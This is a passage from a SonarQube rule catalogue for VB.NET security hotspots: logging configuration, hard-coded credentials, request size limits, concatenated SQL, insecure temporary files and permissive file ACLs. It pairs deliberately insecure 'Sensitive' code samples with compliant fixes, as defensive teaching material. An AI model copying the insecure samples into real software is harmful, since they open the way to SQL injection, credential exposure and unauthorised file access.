  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4792">
              vbnet:S4792
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285">CVE-2018-0285</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127">CVE-2000-1127</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113">CVE-2017-15113</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn’t have its loggers in "debug" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><strong>.Net Core</strong>: configure programmatically</p>
<pre>
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports Microsoft.AspNetCore
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting
Imports Microsoft.Extensions.Configuration
Imports Microsoft.Extensions.DependencyInjection
Imports Microsoft.Extensions.Logging
Imports Microsoft.Extensions.Options

Namespace MvcApp

    Public Class ProgramLogging

        Public Shared Function CreateWebHostBuilder(args As String()) As IWebHostBuilder

            WebHost.CreateDefaultBuilder(args) _
                .ConfigureLogging(Function(hostingContext, Logging) ' Sensitive
                                      ' ...
                                  End Function) _
            .UseStartup(Of StartupLogging)()

            '...
        End Function
    End Class


    Public Class StartupLogging

        Public Sub ConfigureServices(services As IServiceCollection)

            services.AddLogging(Function(logging) ' Sensitive
                                    '...
                                End Function)
        End Sub

        Public Sub Configure(app As IApplicationBuilder, env As IHostingEnvironment, loggerFactory As ILoggerFactory)

            Dim config As IConfiguration = Nothing
            Dim level As LogLevel = LogLevel.Critical
            Dim includeScopes As Boolean = False
            Dim filter As Func(Of String, Microsoft.Extensions.Logging.LogLevel, Boolean) = Nothing
            Dim consoleSettings As Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings = Nothing
            Dim azureSettings As Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings = Nothing
            Dim eventLogSettings As Microsoft.Extensions.Logging.EventLog.EventLogSettings = Nothing

            ' An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.
            loggerFactory.AddAzureWebAppDiagnostics() ' Sensitive
            loggerFactory.AddAzureWebAppDiagnostics(azureSettings) ' Sensitive
            loggerFactory.AddConsole() ' Sensitive
            loggerFactory.AddConsole(level) ' Sensitive
            loggerFactory.AddConsole(level, includeScopes) ' Sensitive
            loggerFactory.AddConsole(filter) ' Sensitive
            loggerFactory.AddConsole(filter, includeScopes) ' Sensitive
            loggerFactory.AddConsole(config) ' Sensitive
            loggerFactory.AddConsole(consoleSettings) ' Sensitive
            loggerFactory.AddDebug() ' Sensitive
            loggerFactory.AddDebug(level) ' Sensitive
            loggerFactory.AddDebug(filter) ' Sensitive
            loggerFactory.AddEventLog() ' Sensitive
            loggerFactory.AddEventLog(eventLogSettings) ' Sensitive
            loggerFactory.AddEventLog(level) ' Sensitive
            ' Only available for NET Standard 2.0 and above
            'loggerFactory.AddEventSourceLogger() ' Sensitive

            Dim providers As IEnumerable(Of ILoggerProvider) = Nothing
            Dim filterOptions1 As LoggerFilterOptions = Nothing
            Dim filterOptions2 As IOptionsMonitor(Of LoggerFilterOptions) = Nothing

            Dim factory As LoggerFactory = New LoggerFactory() ' Sensitive
            factory = New LoggerFactory(providers) ' Sensitive
            factory = New LoggerFactory(providers, filterOptions1) ' Sensitive
            factory = New LoggerFactory(providers, filterOptions2) ' Sensitive
        End Sub
    End Class
End Namespace
</pre>
<p><strong>Log4Net</strong></p>
<pre>
Imports System
Imports System.IO
Imports System.Xml
Imports log4net.Appender
Imports log4net.Config
Imports log4net.Repository

Namespace Logging
    Class Log4netLogging
        Private Sub Foo(ByVal repository As ILoggerRepository, ByVal element As XmlElement, ByVal configFile As FileInfo, ByVal configUri As Uri, ByVal configStream As Stream, ByVal appender As IAppender, ParamArray appenders As IAppender())
            log4net.Config.XmlConfigurator.Configure(repository) ' Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, element) ' Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configFile) ' Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configUri) ' Sensitive
            log4net.Config.XmlConfigurator.Configure(repository, configStream) ' Sensitive
            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile) ' Sensitive

            log4net.Config.DOMConfigurator.Configure() ' Sensitive
            log4net.Config.DOMConfigurator.Configure(repository) ' Sensitive
            log4net.Config.DOMConfigurator.Configure(element) ' Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, element) ' Sensitive
            log4net.Config.DOMConfigurator.Configure(configFile) ' Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, configFile) ' Sensitive
            log4net.Config.DOMConfigurator.Configure(configStream) ' Sensitive
            log4net.Config.DOMConfigurator.Configure(repository, configStream) ' Sensitive
            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile) ' Sensitive
            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile) ' Sensitive

            log4net.Config.BasicConfigurator.Configure() ' Sensitive
            log4net.Config.BasicConfigurator.Configure(appender) ' Sensitive
            log4net.Config.BasicConfigurator.Configure(appenders) ' Sensitive
            log4net.Config.BasicConfigurator.Configure(repository) ' Sensitive
            log4net.Config.BasicConfigurator.Configure(repository, appender) ' Sensitive
            log4net.Config.BasicConfigurator.Configure(repository, appenders) ' Sensitive
        End Sub
    End Class
End Namespace
</pre>
<p><strong>NLog</strong>: configure programmatically</p>
<pre>
Namespace Logging
    Class NLogLogging
        Private Sub Foo(ByVal config As NLog.Config.LoggingConfiguration)
            NLog.LogManager.Configuration = config ' Sensitive
        End Sub
    End Class
End Namespace
</pre>
<p><strong>Serilog</strong></p>
<pre>
Namespace Logging
    Class SerilogLogging
        Private Sub Foo()
            Dim config As Serilog.LoggerConfiguration = New Serilog.LoggerConfiguration() ' Sensitive
        End Sub
    End Class
End Namespace
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">Top 10 2017 Category A10 -
  Insufficient Logging &amp; Monitoring</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/117">CWE-117 - Improper Output Neutralization for Logs</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/532">CWE-532 - Information Exposure Through Log Files</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2068">
              vbnet:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
Dim username As String = "admin"
Dim password As String = "Password123" ' Sensitive
Dim usernamePassword As String = "user=admin&amp;password=Password123" ' Sensitive
Dim url As String = "scheme://user:Admin123@domain.com" ' Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim username As String = "admin"
Dim password As String = GetEncryptedPassword()
Dim usernamePassword As String = String.Format("user={0}&amp;password={1}", GetEncryptedUsername(), GetEncryptedPassword())
Dim url As String = $"scheme://{username}:{password}@domain.com"

Dim url2 As String= "http://guest:guest@domain.com" ' Compliant
Const Password_Property As String = "custom.password" ' Compliant
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Issue is not raised when URI username and password are the same. </li>
  <li> Issue is not raised when searched pattern is found in variable name and value. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5693">
              vbnet:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevent DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> size limits are not defined for the different resources of the web application. </li>
  <li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting">rate limiting</a> features. </li>
  <li> the web application infrastructure has limited resources. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul>
      <li> lower or equal to 8mb for file uploads. </li>
      <li> lower or equal to 2mb for other requests. </li>
    </ul>  </li>
</ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<pre>
Imports Microsoft.AspNetCore.Mvc

Public Class MyController
    Inherits Controller

    &lt;HttpPost&gt;
    &lt;DisableRequestSizeLimit&gt; ' Sensitive: No size  limit
    &lt;RequestSizeLimit(10485760)&gt; ' Sensitive: 10485760 B = 10240 KB = 10 MB is more than the recommended limit of 8MB
    Public Function PostRequest(Model model) As IActionResult
    ' ...
    End Function

    &lt;HttpPost&gt;
    &lt;RequestFormLimits(MultipartBodyLengthLimit = 10485760)&gt; ' Sensitive: 10485760 B = 10240 KB = 10 MB is more than the recommended limit of 8MB
    Public Function MultipartFormRequest(Model model) As IActionResult
    ' ...
    End Function

End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports Microsoft.AspNetCore.Mvc

Public Class MyController
    Inherits Controller

    &lt;HttpPost&gt;
    &lt;RequestSizeLimit(8388608)&gt; ' Compliant: 8388608 B = 8192 KB = 8 MB
    Public Function PostRequest(Model model) As IActionResult
    ' ...
    End Function

    &lt;HttpPost&gt;
    &lt;RequestFormLimits(MultipartBodyLengthLimit = 8388608)&gt; ' Compliant: 8388608 B = 8192 KB = 8 MB
    Public Function MultipartFormRequest(Model model) AS IActionResult
    ' ...
    End Function

End Class
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2077">
              vbnet:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href='/organizations/sopra-steria/rules?open=vbnet%3AS3649&rule_key=vbnet%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted queries.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some parts of the query come from untrusted values (like user inputs). </li>
  <li> The query is repeated/duplicated in other parts of the code. </li>
  <li> The application must support different types of relational databases. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>
  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
Public Sub SqlCommands(ByVal connection As SqlConnection, ByVal query As String, ByVal param As String)
    Dim sensitiveQuery As String = String.Concat(query, param)
    command = New SqlCommand(sensitiveQuery) ' Sensitive

    command.CommandText = sensitiveQuery ' Sensitive

    Dim adapter As SqlDataAdapter
    adapter = New SqlDataAdapter(sensitiveQuery, connection) ' Sensitive
End Sub

Public Sub Foo(ByVal context As DbContext, ByVal query As String, ByVal param As String)
    Dim sensitiveQuery As String = String.Concat(query, param)
    context.Database.ExecuteSqlCommand(sensitiveQuery) ' Sensitive

    context.Query(Of User)().FromSql(sensitiveQuery) ' Sensitive
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub Foo(ByVal context As DbContext, ByVal value As String)
    context.Database.ExecuteSqlCommand("SELECT * FROM mytable WHERE mycol=@p0", value) ' Compliant, the query is parameterized
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5443">
              vbnet:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code>, <code>TMPDIR</code> and
<code>TEMP</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>\Windows\Temp</code> </li>
  <li> <code>\Temp</code> </li>
  <li> <code>\TMP</code> </li>
  <li> <code>%USERPROFILE%\AppData\Local\Temp</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Out of the box, .NET is missing secure-by-design APIs to create temporary files. To overcome this, one of the following options can be used:</p>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Created temporary files in a publicly writable folder and make sure:
    <ul>
      <li> Generated filename is unpredictable </li>
      <li> File is readable and writable only by the creating user ID </li>
      <li> File descriptor is not inherited by child processes </li>
      <li> File is destroyed as soon as it is closed </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
Using Writer As New StreamWriter("/tmp/f") ' Sensitive
' ...
End Using
</pre>
<pre>
Dim Tmp As String = Environment.GetEnvironmentVariable("TMP") ' Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim RandomPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName())

' Creates a new file with write, non inheritable permissions which is deleted on close.
Using FileStream As New FileStream(RandomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose)
    Using Writer As New StreamWriter(FileStream) ' Sensitive
    ' ...
    End Using
End Using
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5445">
              vbnet:S5445
            </a>
          </td>
          <td>
            <details>
              <p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a
situation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that
are not atomic.</p>
<h2>Why is this an issue?</h2>
<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a
given file between when the application chooses its name and when it creates it.</p>
<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be
different than expected. This can lead to trust boundary issues.</p>
<h3>What is the potential impact?</h3>
<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s
logic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or
emptied. They may also alter the file’s content before or while the application uses it.</p>
<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various
consequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>
<h4>Information disclosure</h4>
<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.
This might be especially critical if this information is sensitive.</p>
<p>For example, an application might use temporary files to store users' session-related information. In such a case, attackers controlling those
files can access session-stored information. This might allow them to take over authenticated users' identities and entitlements.</p>
<h4>Attack surface extension</h4>
<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In
that case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In
such a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>
<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files'
content can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the
application hosting server and take it over.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.IO

Sub Example()
    Dim TempPath = Path.GetTempFileName() 'Noncompliant

    Using Writer As New StreamWriter(TempPath)
        Writer.WriteLine("content")
    End Using
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.IO

Sub Example()
    Dim RandomPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName())

    Using FileStream As New FileStream(RandomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose)
        Using Writer As New StreamWriter(FileStream)
            Writer.WriteLine("content")
        End Using
    End Using
End Sub
</pre>
<h3>How does this work?</h3>
<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files' name, location, and
permissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications' technology stacks.</p>
<h4>Strong security controls</h4>
<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling
functions and APIs can also be used for that purpose.</p>
<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating
the files:</p>
<ul>
  <li> Files should be created in a non-public directory. </li>
  <li> File names should be unique. </li>
  <li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li>
  <li> File creation should fail if a target file already exists. </li>
</ul>
<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>
<p>Here the example compliant code uses the <code>Path.GetTempPath</code> and <code>Path.GetRandomFileName</code> functions to generate a unique
random file name. The file is then open with the <code>FileMode.CreateNew</code> option that will ensure the creation fails if the file already
exists. The <code>FileShare.None</code> option will additionally prevent the file from being opened again by any process. To finish, this code ensures
the file will get destroyed once the application has finished using it with the <code>FileOptions.DeleteOnClose</code> option.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP</a> - Insecure Temporary File </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2612">
              vbnet:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix, "others" class refers to all users except the owner of the file and the members of the group assigned to this file.</p>
<p>In Windows, "Everyone" group is similar and includes all members of the Authenticated Users group as well as the built-in Guest account, and
several other built-in security accounts.</p>
<p>Granting permissions to these groups can lead to unintended access to files.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>.Net Framework:</p>
<pre>
Dim unsafeAccessRule = new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow)

Dim fileSecurity = File.GetAccessControl("path")
fileSecurity.AddAccessRule(unsafeAccessRule) ' Sensitive
fileSecurity.SetAccessRule(unsafeAccessRule) ' Sensitive
File.SetAccessControl("fileName", fileSecurity)
</pre>
<p>.Net / .Net Core</p>
<pre>
Dim fileInfo = new FileInfo("path")
Dim fileSecurity = fileInfo.GetAccessControl()

fileSecurity.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.Write, AccessControlType.Allow)) ' Sensitive
fileInfo.SetAccessControl(fileSecurity)
</pre>
<p>.Net / .Net Core using Mono.Posix.NETStandard</p>
<pre>
Dim fileSystemEntry = UnixFileSystemInfo.GetFileSystemEntry("path")
fileSystemEntry.FileAccessPermissions = FileAccessPermissions.OtherReadWriteExecute ' Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>.Net Framework</p>
<pre>
Dim safeAccessRule = new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Deny)

Dim fileSecurity = File.GetAccessControl("path")
fileSecurity.AddAccessRule(safeAccessRule)
File.SetAccessControl("path", fileSecurity)
</pre>
<p>.Net / .Net Core</p>
